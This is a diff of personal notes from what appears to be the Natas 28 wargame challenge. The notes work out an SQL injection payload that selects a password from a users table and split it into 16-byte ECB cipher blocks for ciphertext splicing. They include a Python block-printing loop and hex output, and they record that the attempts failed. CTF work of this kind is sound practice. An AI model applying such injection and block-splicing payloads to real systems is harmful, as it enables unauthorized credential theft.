@@ -109,17 +109,23 @@ select * from jokes where joke like '<user input>'
 
 so if we want to inject into this...
 
-...like 'aaaaaaaaa'; select password from users where username = natas29
+...like 'aaaaaaaaa'; select password from users where username = natas29-- 
 
 putting this into 16 character blocks...
-aaaaaaaaa'
-; select passwo     7b 28 d1 ff 83 cc 1b fb 43 ca 13 66 19 47 dc 39 
+......aaaaaaaaa\    <-- single quote is escaped and moved to the next line.
+'; select passwo    7b 28 d1 ff 83 cc 1b fb 43 ca 13 66 19 47 dc 39 
 rd from users wh    ee 65 78 7b e7 bf dc 9d 66 20 8f e7 96 a2 3e f0 
 ere username lik    1c e5 0d 2d f4 bd 4d f3 e0 03 a2 d2 e7 35 f8 70 
-e natas29;-- aaa    e8 5d f0 50 61 3c 52 83 63 c9 c4 41 23 67 f2 8a 
+e natas29;--        5e 75 18 ee fb a3 73 d9 34 bc 43 c2 6a bc b9 4d  
 
 loop for printing the payload in 16 character blocks
-for i in range(5):
+str = '; select password from users where username like natas29;--    '
+chars = list()
+
+for char in str:
+    chars += char
+
+for i in range(4):
     if i == 0:
         print(''.join(chars[0:15]))
     if i > 0:
@@ -127,3 +133,27 @@ for i in range(5):
         y = x + 16
         print(''.join(chars[x:y]))
 
+loop for testing payloads in payload.py
+
+block for 10 a's
+
+1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c 
+dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 
+c0 87 2d ee 8b c9 0b 11 56 91 3b 08 a2 23 a3 9e 
+
+block for payload
+
+7b 28 d1 ff 83 cc 1b fb 43 ca 13 66 19 47 dc 39 
+ee 65 78 7b e7 bf dc 9d 66 20 8f e7 96 a2 3e f0 
+1c e5 0d 2d f4 bd 4d f3 e0 03 a2 d2 e7 35 f8 70 
+5e 75 18 ee fb a3 73 d9 34 bc 43 c2 6a bc b9 4d 
+
+final block (based on last line of the payload)
+
+73 8a 5f fb 4a 45 00 24 67 75 17 5a e5 96 bb d6 
+f3 4d f3 39 c6 9e dc e1 1f 66 50 bb ce d6 27 02
+
+didn't work, probably something wrong with the SQL query
+
+maybe if we change the 7b at the start of the payload block to b2?
+nope, still doesn't work.
